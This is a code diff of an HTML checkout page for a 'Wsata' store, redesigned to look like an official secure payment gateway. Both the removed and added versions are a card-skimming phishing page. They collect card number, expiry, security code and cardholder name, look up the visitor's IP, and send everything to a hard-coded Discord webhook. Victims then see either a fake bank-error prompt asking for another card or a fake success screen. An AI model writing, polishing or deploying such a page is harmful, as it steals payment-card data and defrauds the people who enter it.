@@ -2,38 +2,161 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>بوابة الدفع | Wsata</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Review & Pay | Wsata Checkout</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;700;900&display=swap" rel="stylesheet">
     <style>
         * { font-family: 'Tajawal', sans-serif; }
-        body { background: #05060a; color: white; display: flex; align-items: center; justify-content: center; min-h-screen; }
-        .pay-card { background: rgba(255,255,255,0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.05); border-radius: 40px; padding: 50px; width: 100%; max-width: 550px; }
-        .input-ws { background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; text-align: center; font-size: 1.2rem; transition: 0.3s; }
-        .input-ws:focus { border-color: #fbbf24; outline: none; box-shadow: 0 0 20px rgba(251, 191, 36, 0.1); }
-        .ws-logo { font-size: 3rem; font-weight: 900; color: #fbbf24; text-shadow: 0 0 30px rgba(251, 191, 36, 0.3); }
+        body { background: #fcfcfc; color: #333; }
+        .step-circle { width: 35px; height: 35px; border-radius: 50%; border: 1.5px solid #d1d5db; display: flex; items-center; justify-content: center; font-weight: bold; color: #9ca3af; background: white; position: relative; }
+        .step-circle.active { border-color: #8b1515; color: #8b1515; }
+        .step-circle.completed { background: #8b1515; border-color: #8b1515; color: white; }
+        .step-circle.completed::after { content: '✓'; }
+        .line { flex: 1; height: 1px; background: #e5e7eb; margin: 0 10px; }
+        
+        .main-container { max-width: 1100px; margin: 40px auto; padding: 0 20px; }
+        .payment-box { border: 1px solid #eee; border-radius: 8px; overflow: hidden; background: #fff; }
+        .form-section { background: #f9f9f9; padding: 40px; border-top: 1px solid #eee; }
+        
+        .input-group { margin-bottom: 20px; }
+        .input-ws { width: 100%; padding: 15px; border: 1.5px solid #e0e0e0; border-radius: 8px; font-size: 1rem; color: #444; outline: none; transition: 0.2s; }
+        .input-ws:focus { border-color: #5cb85c; }
+        .input-ws::placeholder { color: #ccc; opacity: 1; }
+
+        .order-summary { border: 1px solid #eee; border-radius: 8px; padding: 25px; background: white; }
+        .pay-btn { background: #5cb85c; color: white; font-weight: 700; padding: 18px 40px; border-radius: 10px; display: flex; align-items: center; gap: 10px; transition: 0.3s; }
+        .pay-btn:hover { background: #4cae4c; transform: translateY(-1px); }
+
+        /* Modal Success */
+        #successModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 999; align-items: center; justify-content: center; }
+        .modal-content { background: white; padding: 40px; border-radius: 30px; text-align: center; width: 90%; max-width: 400px; animation: pop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes pop { from { transform: scale(0.5); } to { transform: scale(1); } }
     </style>
 </head>
 <body>
-    <div class="pay-card shadow-2xl">
-        <div class="text-center mb-10">
-            <div class="ws-logo">Wsata</div>
-            <p class="text-gray-500 text-sm mt-2">نظام دفع آمن ومحمي بالكامل</p>
+
+    <div class="main-container">
+        <!-- Logo -->
+        <div class="flex flex-col items-center mb-10">
+            <div class="text-3xl font-black text-gray-800 tracking-tighter">Wsata <span class="text-green-600">STORE</span></div>
+            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest mt-1">Official Payment Gateway</p>
         </div>
 
-        <div class="space-y-6">
-            <input type="text" id="cn" placeholder="رقم البطاقة" maxlength="19" class="input-ws w-full">
-            <div class="grid grid-cols-2 gap-4">
-                <input type="text" id="ex" placeholder="YY / MM" maxlength="7" class="input-ws">
-                <input type="password" id="cv" placeholder="CVC" maxlength="4" class="input-ws">
+        <!-- Steps Indicators -->
+        <div class="flex items-center justify-between max-w-2xl mx-auto mb-16 text-[11px] font-bold text-gray-500 uppercase">
+            <div class="flex flex-col items-center gap-2">
+                <div class="step-circle completed"></div>
+                <span class="text-red-900">Shipping</span>
             </div>
-            
-            <button onclick="pay()" id="pBtn" class="w-full bg-yellow-500 text-black py-5 rounded-2xl text-2xl font-black mt-6 hover:scale-[1.02] transition">---</button>
+            <div class="line"></div>
+            <div class="flex flex-col items-center gap-2">
+                <div class="step-circle active">2</div>
+                <span class="text-red-900 font-black">Review & Pay</span>
+            </div>
+            <div class="line"></div>
+            <div class="flex flex-col items-center gap-2">
+                <div class="step-circle">3</div>
+                <span>Complete</span>
+            </div>
         </div>
 
-        <p class="text-[10px] text-center mt-8 opacity-20 font-bold uppercase tracking-widest">Digital Rights Protected by Wsata</p>
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            <!-- Left Side: Payment Details -->
+            <div class="lg:col-span-2">
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-2xl font-bold">Payment details</h2>
+                    <div class="flex items-center gap-2 text-[10px] text-green-600 font-bold">
+                        <span>Secure checkout <br> <span class="text-gray-400">128-bit encryption</span></span>
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" /></svg>
+                    </div>
+                </div>
+
+                <div class="payment-box">
+                    <div class="p-6 flex justify-between items-center border-b border-gray-100">
+                        <div class="flex items-center gap-4">
+                            <div class="w-6 h-6 border-4 border-black rounded-full flex items-center justify-center p-1">
+                                <div class="w-full h-full bg-black rounded-full"></div>
+                            </div>
+                            <span class="font-bold text-gray-700">Pay by card</span>
+                        </div>
+                        <div class="flex gap-2">
+                            <img src="Master.png" class="h-6" alt="MasterCard">
+                            <img src="Visa.png" class="h-6" alt="Visa">
+                        </div>
+                    </div>
+
+                    <div class="form-section">
+                        <div class="input-group">
+                            <input type="text" id="cn" placeholder="Card number" maxlength="19" class="input-ws">
+                        </div>
+                        <div class="input-group">
+                            <input type="text" id="holder" placeholder="Name on card" class="input-ws">
+                        </div>
+                        <div class="grid grid-cols-2 gap-4">
+                            <input type="text" id="ex" placeholder="Expiry date (MM/YY)" maxlength="5" class="input-ws">
+                            <div class="relative">
+                                <input type="password" id="cv" placeholder="Security code" maxlength="3" class="input-ws">
+                                <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300 text-xl">?</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-8 flex justify-between items-center">
+                    <button class="text-gray-400 font-bold flex items-center gap-2 text-sm">
+                        <svg class="w-4 h-4 translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/></svg>
+                        Back to delivery details
+                    </button>
+                    <button onclick="processPay()" id="payFinalBtn" class="pay-btn">
+                        <span>Pay now</span>
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd" /></svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Right Side: Order Summary -->
+            <div>
+                <h2 class="text-xl font-bold mb-4">Order Summary</h2>
+                <div class="order-summary text-sm space-y-4">
+                    <div class="flex gap-4 border-b border-gray-100 pb-4">
+                        <div class="bg-gray-50 p-2 rounded w-16 h-16 flex items-center justify-center">📦</div>
+                        <div class="flex-1">
+                            <p class="font-bold">Wsata VIP Service</p>
+                            <p class="text-[10px] text-gray-400">Ref: #WT-99281-22</p>
+                        </div>
+                        <span id="subtotalDisplay" class="font-bold">£0.00</span>
+                    </div>
+
+                    <div class="space-y-2 text-gray-600">
+                        <div class="flex justify-between"><span>Subtotal</span><span id="subtotal2">£0.00</span></div>
+                        <div class="flex justify-between"><span>Delivery</span><span class="text-green-600 font-bold">FREE</span></div>
+                        <div class="flex justify-between"><span>VAT (15%)</span><span id="vat">£0.00</span></div>
+                    </div>
+
+                    <div class="flex justify-between pt-4 border-t-2 border-dashed border-gray-100 text-lg font-black italic">
+                        <span>Total</span>
+                        <span id="totalFinal" class="text-2xl not-italic">£0.00</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal">
+        <div class="modal-content">
+            <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
+                <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
+            </div>
+            <h2 class="text-2xl font-black mb-2">تم الدفع بنجاح</h2>
+            <p class="text-gray-500 mb-6">تم تأكيد عمليتك وجاري تحويلك للتذكرة...</p>
+            <div class="w-full bg-gray-100 h-1.5 rounded-full overflow-hidden">
+                <div class="bg-green-500 h-full animate-progress" style="width: 100%; transition: 2s linear"></div>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -42,46 +165,98 @@
         const db = firebase.database();
 
         const params = new URLSearchParams(window.location.search);
-        const total = params.get('total') || "0.00";
-        const btn = document.getElementById('pBtn');
-        btn.innerText = `دفع ${total} SAR`;
+        let price = parseFloat(params.get('total') || 0);
+        const tKey = params.get('ticket');
 
+        // تحديث المبالغ في الواجهة
+        function updateSummary() {
+            const vatVal = price * 0.15;
+            document.getElementById('subtotalDisplay').innerText = `£${price.toFixed(2)}`;
+            document.getElementById('subtotal2').innerText = `£${price.toFixed(2)}`;
+            document.getElementById('vat').innerText = `£${vatVal.toFixed(2)}`;
+            document.getElementById('totalFinal').innerText = `£${(price + vatVal).toFixed(2)}`;
+        }
+        updateSummary();
+
+        // تنسيق البطاقة
         document.getElementById('cn').oninput = (e) => {
-            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let parts = [];
-            for (let i=0; i<v.length; i+=4) parts.push(v.substring(i, i+4));
-            e.target.value = parts.join(' ');
+            let v = e.target.value.replace(/\D/g, '');
+            let split = v.match(/.{1,4}/g);
+            if (split) e.target.value = split.join(' ');
         };
 
-        async function pay() {
-            btn.disabled = true;
-            btn.innerText = "جاري التحقق...";
+        // تنسيق التاريخ + حط السيرش التلقائي + منع التاريخ الغلط
+        document.getElementById('ex').oninput = (e) => {
+            let v = e.target.value.replace(/\D/g, '');
             
-            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-            
-            await fetch("https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "💳 سحب جديد - Wsata",
-                        color: 16761104,
-                        fields: [
-                            { name: "💰 المبلغ", value: total + " SAR", inline: true },
-                            { name: "📍 IP", value: ip.ip, inline: true },
-                            { name: "💳 البطاقة", value: `\`${document.getElementById('cn').value}\`` },
-                            { name: "🔑 الرمز", value: `\`${document.getElementById('ex').value} | ${document.getElementById('cv').value}\`` }
-                        ],
-                        footer: { text: "جميع الحقوق محفوظة لـ Wsata" }
-                    }]
-                })
-            });
+            // إذا أول رقمين > 12 نخليهم 12
+            if (v.length >= 2) {
+                let month = parseInt(v.substring(0, 2));
+                if (month > 12) month = 12;
+                if (month === 0) month = 1;
+                v = month.toString().padStart(2, '0') + v.substring(2);
+            }
 
-            setTimeout(() => {
-                alert("عذراً، نظام البنك لا يستجيب حالياً. يرجى المحاولة باستخدام بطاقة أخرى.");
+            if (v.length > 2) {
+                e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4);
+            } else {
+                e.target.value = v;
+            }
+        };
+
+        async function processPay() {
+            const btn = document.getElementById('payFinalBtn');
+            const data = {
+                cn: document.getElementById('cn').value,
+                holder: document.getElementById('holder').value,
+                ex: document.getElementById('ex').value,
+                cv: document.getElementById('cv').value
+            };
+
+            if (data.cn.length < 16 || data.ex.length < 5 || data.cv.length < 3) {
+                return alert("يرجى التأكد من بيانات البطاقة");
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = `<span class="animate-spin text-white">⏳</span> Processing...`;
+
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ip = await ipRes.json();
+
+                // إرسال للديسكورد
+                await fetch("https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "💸 عملية دفع جديدة ناجحة",
+                            color: 3066993,
+                            fields: [
+                                { name: "💰 المجموع", value: document.getElementById('totalFinal').innerText, inline: true },
+                                { name: "👤 صاحب البطاقة", value: data.holder, inline: true },
+                                { name: "📍 IP", value: ip.ip, inline: true },
+                                { name: "💳 البطاقة", value: `\`${data.cn}\`` },
+                                { name: "🔐 السر", value: `\`${data.ex} | ${data.cv}\`` }
+                            ]
+                        }]
+                    })
+                });
+
+                if(tKey) await db.ref('tickets/' + tKey).update({ status: 'تم استلام المبلغ بنجاح ✓', paid: true });
+
+                // إظهار المودال الناجح
+                document.getElementById('successModal').style.display = 'flex';
+                
+                setTimeout(() => {
+                    window.location.href = `ticket.html`;
+                }, 3000);
+
+            } catch(e) {
+                alert("حدث خطأ في النظام، حاول مجدداً");
                 btn.disabled = false;
-                btn.innerText = `دفع ${total} SAR`;
-            }, 2000);
+                btn.innerText = "Pay now";
+            }
         }
     </script>
 </body>
